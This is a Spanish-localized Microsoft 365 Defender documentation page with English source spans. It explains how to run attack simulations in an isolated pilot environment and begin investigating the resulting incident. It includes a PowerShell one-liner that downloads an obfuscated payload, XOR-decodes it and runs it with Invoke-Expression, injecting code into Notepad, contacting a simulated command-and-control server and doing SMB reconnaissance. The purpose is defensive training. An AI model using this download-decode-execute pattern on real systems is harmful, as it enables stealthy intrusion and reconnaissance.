---
title: Ejecutar una simulación de ataque en un entorno Microsoft 365 Defender piloto, entorno aislado para simulación de ataque, respuesta, corrección
description: Ejecute simulaciones de ataques Microsoft 365 Defender para ver cómo se presentan las alertas e incidentes, se ganan conocimientos y se corrigen rápidamente las amenazas.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 07/15/2021
ms.locfileid: "53458615"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a><span data-ttu-id="bcdcc-103">Ejecutar una simulación de ataque en un Microsoft 365 Defender piloto</span><span class="sxs-lookup"><span data-stu-id="bcdcc-103">Run an attack simulation in a Microsoft 365 Defender pilot environment</span></span>


<span data-ttu-id="bcdcc-104">Este artículo es [el paso 1 de 2](eval-defender-investigate-respond.md) en el proceso de realizar una investigación y respuesta de un incidente en Microsoft 365 Defender un entorno piloto.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-104">This article is [Step 1 of 2](eval-defender-investigate-respond.md) in the process of performing an investigation and response of an incident in Microsoft 365 Defender using a pilot environment.</span></span> <span data-ttu-id="bcdcc-105">Para obtener más información acerca de este proceso, vea el [artículo de introducción.](eval-defender-investigate-respond.md)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-105">For more information about this process, see the [overview](eval-defender-investigate-respond.md) article.</span></span>

<span data-ttu-id="bcdcc-106">Después de preparar el entorno [piloto,](eval-defender-investigate-respond.md)es hora de probar la respuesta a incidentes de Microsoft 365 Defender y las capacidades automatizadas de investigación y corrección creando un incidente con un ataque simulado y usando el portal de Microsoft 365 Defender para investigar y responder.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-106">After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft 365 Defender portal to investigate and respond.</span></span>

<span data-ttu-id="bcdcc-107">Un incidente en Microsoft 365 Defender es una colección de alertas correlacionadas y datos asociados que son la historia de un ataque.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-107">An incident in Microsoft 365 Defender is a collection of correlated alerts and associated data that make up the story of an attack.</span></span>

<span data-ttu-id="bcdcc-108">Microsoft 365 servicios y aplicaciones crean alertas cuando detectan un evento o actividad sospechosos o malintencionados.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-108">Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity.</span></span> <span data-ttu-id="bcdcc-109">Las alertas individuales proporcionan pistas valiosas sobre un ataque completado o en curso.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-109">Individual alerts provide valuable clues about a completed or ongoing attack.</span></span> <span data-ttu-id="bcdcc-110">Sin embargo, los ataques suelen emplear varias técnicas en distintos tipos de entidades, como dispositivos, usuarios y buzones.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-110">However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes.</span></span> <span data-ttu-id="bcdcc-111">El resultado son varias alertas para varias entidades del espacio empresarial.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-111">The result is multiple alerts for multiple entities in your tenant.</span></span>

>[!Note]
><span data-ttu-id="bcdcc-112">Si es completamente nuevo en el análisis [](first-incident-overview.md) de seguridad y la respuesta a incidentes, consulte el tutorial Responder a su primer incidente para obtener una visita guiada a un proceso típico de análisis, corrección y revisión posterior al incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-112">If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](first-incident-overview.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.</span></span>
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a><span data-ttu-id="bcdcc-113">Simular ataques con el portal Microsoft 365 Defender web</span><span class="sxs-lookup"><span data-stu-id="bcdcc-113">Simulate attacks with the Microsoft 365 Defender portal</span></span>

<span data-ttu-id="bcdcc-114">El portal Microsoft 365 Defender cuenta con capacidades integradas para crear ataques simulados en el entorno piloto:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-114">The Microsoft 365 Defender portal has built-in capabilities to create simulated attacks on your pilot environment:</span></span>

- <span data-ttu-id="bcdcc-115">Aprendizaje de simulación de ataques Microsoft 365 Defender para Office 365 en [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) .</span><span class="sxs-lookup"><span data-stu-id="bcdcc-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).</span></span>
  
  <span data-ttu-id="bcdcc-116">En el portal Microsoft 365 Defender, seleccione Correo electrónico **& colaboración > de simulación de ataques**.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-116">In the Microsoft 365 Defender portal, select **Email & collaboration > Attack simulation training**.</span></span>

- <span data-ttu-id="bcdcc-117">Tutoriales de ataques & simulaciones para Microsoft 365 Defender para extremos en [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) .</span><span class="sxs-lookup"><span data-stu-id="bcdcc-117">Attack tutorials & simulations for Microsoft 365 Defender for Endpoints at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).</span></span>

  <span data-ttu-id="bcdcc-118">En el portal Microsoft 365 Defender, seleccione **Endpoints > Tutoriales & simulaciones**.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-118">In the Microsoft 365 Defender portal, select **Endpoints > Tutorials & simulations**.</span></span>

### <a name="defender-for-office-365-attack-simulation-training"></a><span data-ttu-id="bcdcc-119">Defender para el Office 365 de simulación de ataques</span><span class="sxs-lookup"><span data-stu-id="bcdcc-119">Defender for Office 365 Attack simulation training</span></span>

<span data-ttu-id="bcdcc-120">Defender para Office 365 con Microsoft 365 E5 o Microsoft Defender para Office 365 Plan 2 incluye entrenamiento de simulación de ataques para ataques de suplantación de identidad.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span></span> <span data-ttu-id="bcdcc-121">Los pasos básicos son:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-121">The basic steps are:</span></span>

1. <span data-ttu-id="bcdcc-122">Crear una simulación</span><span class="sxs-lookup"><span data-stu-id="bcdcc-122">Create a simulation</span></span>

   <span data-ttu-id="bcdcc-123">Para obtener instrucciones paso a paso sobre cómo crear y enviar una nueva simulación, consulte [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-123">For step by step instructions on how to create and send a new simulation, see [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span></span>

2. <span data-ttu-id="bcdcc-124">Crear una carga</span><span class="sxs-lookup"><span data-stu-id="bcdcc-124">Create a payload</span></span>

   <span data-ttu-id="bcdcc-125">Para obtener instrucciones paso a paso sobre cómo crear una carga para su uso en una simulación, vea [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-125">For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span></span>

3. <span data-ttu-id="bcdcc-126">Obtener información</span><span class="sxs-lookup"><span data-stu-id="bcdcc-126">Gaining insights</span></span>

   <span data-ttu-id="bcdcc-127">Para obtener instrucciones paso a paso sobre cómo obtener información con los informes, consulte Obtener información a través del aprendizaje [de simulación de ataques.](/microsoft-365/security/office-365-security/attack-simulation-training-insights)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-127">For step by step instructions on how to gain insights with reporting, see [Gain insights through Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-insights).</span></span>

<span data-ttu-id="bcdcc-128">Para obtener más información, vea [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-128">For more information, see [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span></span>

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a><span data-ttu-id="bcdcc-129">Tutoriales de ataque de Defender for Endpoint & simulaciones</span><span class="sxs-lookup"><span data-stu-id="bcdcc-129">Defender for Endpoint attack tutorials & simulations</span></span>

<span data-ttu-id="bcdcc-130">Estas son las simulaciones de Defender para puntos de conexión de Microsoft:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-130">Here are the Defender for Endpoint simulations from Microsoft:</span></span>

- <span data-ttu-id="bcdcc-131">El documento deja atrás la puerta trasera</span><span class="sxs-lookup"><span data-stu-id="bcdcc-131">Document drops backdoor</span></span>
- <span data-ttu-id="bcdcc-132">Investigación automatizada (puerta trasera)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-132">Automated investigation (backdoor)</span></span>

<span data-ttu-id="bcdcc-133">Hay simulaciones adicionales de Attack IQ y SafeBreach.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-133">There are additional simulations from Attack IQ and SafeBreach.</span></span> <span data-ttu-id="bcdcc-134">También hay un conjunto de tutoriales.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-134">There are also a set of tutorials.</span></span>

<span data-ttu-id="bcdcc-135">Para cada simulación o tutorial:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-135">For each simulation or tutorial:</span></span>

1. <span data-ttu-id="bcdcc-136">Descargue y lea el documento de recorrido correspondiente proporcionado con la simulación o escenario seleccionado.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-136">Download and read the corresponding walk through document provided with your selected simulation or scenario.</span></span>

2. <span data-ttu-id="bcdcc-137">Descargue el archivo de simulación.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-137">Download the simulation file.</span></span> <span data-ttu-id="bcdcc-138">Puedes elegir descargar el archivo o script en el dispositivo de prueba, pero no es obligatorio.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-138">You can choose to download the file or script on the test device but it's not mandatory.</span></span>

3. <span data-ttu-id="bcdcc-139">Ejecute el archivo de simulación o el script en el dispositivo de prueba como se indica en el documento de recorrido.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-139">Run the simulation file or script on the test device as instructed in the walk through document.</span></span>

 <span data-ttu-id="bcdcc-140">Para obtener más información, vea [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-140">For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span></span>

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a><span data-ttu-id="bcdcc-141">Simular un ataque con un controlador de dominio aislado y un dispositivo cliente (opcional)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-141">Simulate an attack with an isolated domain controller and client device (optional)</span></span>

<span data-ttu-id="bcdcc-142">En este ejercicio de respuesta a incidentes opcional, simulará un ataque a un controlador de dominio de Servicios de dominio de Active Directory (AD DS) aislado y un dispositivo Windows 10 mediante un script de PowerShell y, a continuación, investigará, corregirá y resolverá el incidente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-142">In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows 10 device using a PowerShell script and then investigate, remediate, and resolve the incident.</span></span>

<span data-ttu-id="bcdcc-143">En primer lugar, debe agregar puntos de conexión al entorno piloto.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-143">First, you need to add endpoints to your pilot environment.</span></span>

### <a name="add-pilot-environment-endpoints"></a><span data-ttu-id="bcdcc-144">Agregar extremos de entorno piloto</span><span class="sxs-lookup"><span data-stu-id="bcdcc-144">Add pilot environment endpoints</span></span>

<span data-ttu-id="bcdcc-145">En primer lugar, debes agregar un controlador de dominio de AD DS aislado y un dispositivo Windows 10 a tu entorno piloto.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-145">First, you need to add an isolated AD DS domain controller and a Windows 10 device to your pilot environment.</span></span>

1. <span data-ttu-id="bcdcc-146">Compruebe que el inquilino del entorno piloto [ha habilitado Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-146">Verify your pilot environment tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="bcdcc-147">Compruebe que el controlador de dominio:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-147">Verify that your domain controller:</span></span>

   - <span data-ttu-id="bcdcc-148">Ejecuta Windows Server 2008 R2 o una versión posterior.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-148">Runs Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="bcdcc-149">Informa a [Microsoft Defender para Identity](/azure/security-center/security-center-wdatp) y ha habilitado la administración [remota.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-149">Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="bcdcc-150">Tiene [Microsoft Defender para la identidad y Microsoft Cloud App Security integración habilitada.](/cloud-app-security/mdi-integration)</span><span class="sxs-lookup"><span data-stu-id="bcdcc-150">Has [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) enabled.</span></span>
   - <span data-ttu-id="bcdcc-151">Tiene un usuario de prueba creado en el dominio de prueba.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-151">Has a test user is created in the test domain.</span></span> <span data-ttu-id="bcdcc-152">No se necesitan permisos de nivel de administrador.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-152">Administrator-level permissions are not needed.</span></span>

3. <span data-ttu-id="bcdcc-153">Compruebe que el dispositivo de prueba:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-153">Verify that your test device:</span></span>

   - <span data-ttu-id="bcdcc-154">Ejecuta Windows 10 versión 1903 o una versión posterior.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-154">Runs Windows 10 version 1903 or a later version.</span></span>
   - <span data-ttu-id="bcdcc-155">Está unido al dominio del controlador de dominio de AD DS.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-155">Is joined to the AD DS domain controller domain.</span></span>
   - <span data-ttu-id="bcdcc-156">Tiene [Antivirus de Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) habilitada.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-156">Has [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled.</span></span> <span data-ttu-id="bcdcc-157">Si tiene problemas para habilitar Antivirus de Windows Defender, consulte este tema [de solución de problemas](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-157">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
   - <span data-ttu-id="bcdcc-158">Se [incorpora a Microsoft Defender para endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="bcdcc-159">Si usas grupos de inquilinos y dispositivos, crea un grupo de dispositivos dedicado para el dispositivo de prueba y lo insertas en el nivel superior.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-159">If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.</span></span>

<span data-ttu-id="bcdcc-160">Una alternativa es hospedar el controlador de dominio de AD DS y probar el dispositivo como máquinas virtuales en Microsoft Azure de infraestructura.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-160">One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services.</span></span> <span data-ttu-id="bcdcc-161">Puede usar las instrucciones de la fase [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)de la Guía de laboratorio de pruebas de empresa simulada, pero omitir la creación de la máquina virtual APP1.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-161">You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.</span></span>

<span data-ttu-id="bcdcc-162">Este es el resultado.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-162">Here is the result.</span></span>

![Puntos de conexión para el entorno de evaluación de Defender mediante la Guía de laboratorio de pruebas de empresa simulada](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

<span data-ttu-id="bcdcc-164">Simularás un ataque sofisticado que aprovecha técnicas avanzadas para ocultarte de la detección.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-164">You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="bcdcc-165">El ataque enumera las sesiones de bloque de mensajes de servidor (SMB) abiertas en controladores de dominio y recupera las direcciones IP recientes de los dispositivos de los usuarios.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-165">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="bcdcc-166">Esta categoría de ataques normalmente no incluye archivos descartados en el dispositivo de la víctima y se producen únicamente en la memoria.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-166">This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory.</span></span> <span data-ttu-id="bcdcc-167">"Viven fuera de la tierra" mediante el uso de herramientas administrativas y del sistema existentes e insertan su código en procesos del sistema para ocultar su ejecución.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-167">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution.</span></span> <span data-ttu-id="bcdcc-168">Este comportamiento les permite eludir la detección y persistir en el dispositivo.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-168">Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="bcdcc-169">En esta simulación, nuestro escenario de ejemplo comienza con un script de PowerShell.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-169">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="bcdcc-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span></span> <span data-ttu-id="bcdcc-171">La detección de estos scripts puede ser difícil porque los administradores también suelen ejecutar scripts de forma remota para llevar a cabo diversas actividades administrativas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-171">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Ataque de PowerShell sin archivos con inserción de procesos y diagrama de ataque de reconocimiento SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="bcdcc-173">Durante la simulación, el ataque inserta el shellcode en un proceso aparentemente inocente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-173">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="bcdcc-174">El escenario requiere el uso de notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-174">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="bcdcc-175">Elegimos este proceso para la simulación, pero es más probable que los atacantes se den como destino a un proceso de sistema de larga ejecución, como svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-175">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="bcdcc-176">A continuación, el shellcode pasa a ponerse en contacto con el servidor de comandos y control (C2) del atacante para recibir instrucciones sobre cómo continuar.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-176">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="bcdcc-177">El script intenta ejecutar consultas de reconocimiento en el controlador de dominio (DC).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-177">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="bcdcc-178">El reconocimiento permite a un atacante obtener información sobre la información de inicio de sesión del usuario reciente.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-178">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="bcdcc-179">Una vez que los atacantes tienen esta información, pueden moverse lateralmente en la red para llegar a una cuenta confidencial específica</span><span class="sxs-lookup"><span data-stu-id="bcdcc-179">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="bcdcc-180">Para obtener resultados óptimos, sigue las instrucciones de simulación de ataque lo más de cerca posible.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-180">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a><span data-ttu-id="bcdcc-181">Ejecutar la simulación de ataque de controlador de dominio de AD DS aislado</span><span class="sxs-lookup"><span data-stu-id="bcdcc-181">Run the isolated AD DS domain controller attack simulation</span></span>

<span data-ttu-id="bcdcc-182">Para ejecutar la simulación del escenario de ataque:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-182">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="bcdcc-183">Asegúrese de que el entorno piloto incluye el controlador de dominio de AD DS aislado y Windows 10 dispositivo.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-183">Ensure that your pilot environment includes the isolated AD DS domain controller and Windows 10 device.</span></span>

2. <span data-ttu-id="bcdcc-184">Inicie sesión en el dispositivo de prueba con la cuenta de usuario de prueba.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-184">Sign in to the test device with the test user account.</span></span>

3. <span data-ttu-id="bcdcc-185">Abra una Windows PowerShell en el dispositivo de prueba.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-185">Open a Windows PowerShell window on the test device.</span></span>

4. <span data-ttu-id="bcdcc-186">Copie el siguiente script de simulación:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-186">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="bcdcc-187">Si abre este artículo en un explorador web, es posible que tenga problemas para copiar el texto completo sin perder determinados caracteres ni introducir saltos de línea adicionales.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-187">If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="bcdcc-188">Si este es el caso, descargue este documento y ábralo en Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-188">If this is the case, download this document and open it on Adobe Reader.</span></span>

5. <span data-ttu-id="bcdcc-189">Pegue y ejecute el script copiado en la ventana de PowerShell.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-189">Paste and run the copied script in the PowerShell window.</span></span>

> [!NOTE]
> <span data-ttu-id="bcdcc-190">Si ejecuta PowerShell con el protocolo de escritorio remoto (RDP), use el comando Escribir texto del Portapapeles en el cliente RDP porque es posible que la tecla rápida **CTRL-V** o el método de clic y pegado con el botón secundario no funcionen.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-190">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="bcdcc-191">Las versiones recientes de PowerShell a veces tampoco aceptarán ese método, es posible que deba copiarlo en Bloc de notas en la memoria primero, copiarlo en la máquina virtual y, a continuación, pegarlo en PowerShell.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-191">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="bcdcc-192">Unos segundos más tarde, se abrirá Bloc de notas aplicación.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-192">A few seconds later, the Notepad app will open.</span></span> <span data-ttu-id="bcdcc-193">Se insertará un código de ataque simulado en Bloc de notas.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-193">A simulated attack code will be injected into Notepad.</span></span> <span data-ttu-id="bcdcc-194">Mantenga abierta la instancia de Bloc de notas generada automáticamente para experimentar el escenario completo.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-194">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="bcdcc-195">El código de ataque simulado intentará comunicarse con una dirección IP externa (simulando el servidor C2) y, a continuación, intentará reconocimiento con el controlador de dominio a través de SMB.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-195">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="bcdcc-196">Verá este mensaje en la consola de PowerShell cuando se complete este script:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-196">You'll see this message displayed on the PowerShell console when this script completes:</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="bcdcc-197">Para ver la característica De incidentes y respuesta automatizados en acción, mantenga el notepad.exe proceso abierto.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-197">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="bcdcc-198">Verá El incidente automatizado y la respuesta detienen el Bloc de notas proceso.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-198">You'll see Automated Incident and Response stop the Notepad process.</span></span>

### <a name="investigate-the-incident-for-the-simulated-attack"></a><span data-ttu-id="bcdcc-199">Investigar el incidente del ataque simulado</span><span class="sxs-lookup"><span data-stu-id="bcdcc-199">Investigate the incident for the simulated attack</span></span>

> [!NOTE]
> <span data-ttu-id="bcdcc-200">Antes de ayudarle a través de esta simulación, vea el siguiente vídeo para ver cómo la administración de incidentes le ayuda a crear las alertas relacionadas como parte del proceso de investigación, donde puede encontrarla en el portal y cómo puede ayudarle en las operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="bcdcc-200">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="bcdcc-201">Al cambiar al punto de vista del analista de SOC, ahora puede empezar a investigar el ataque en el portal de Microsoft 365 Defender datos.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-201">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Defender portal.</span></span>

1. <span data-ttu-id="bcdcc-202">Abra el [portal Microsoft 365 Defender](https://security.microsoft.com/).</span><span class="sxs-lookup"><span data-stu-id="bcdcc-202">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="bcdcc-203">En el panel de navegación, seleccione **Incidentes & alertas > incidentes**.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-203">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="bcdcc-204">El nuevo incidente del ataque simulado aparecerá en la cola de incidentes.</span><span class="sxs-lookup"><span data-stu-id="bcdcc-204">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Ejemplo de la cola de incidentes](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="bcdcc-206">Investigar el ataque como un solo incidente</span><span class="sxs-lookup"><span data-stu-id="bcdcc-206">Investigate the attack as a single incident</span></span>

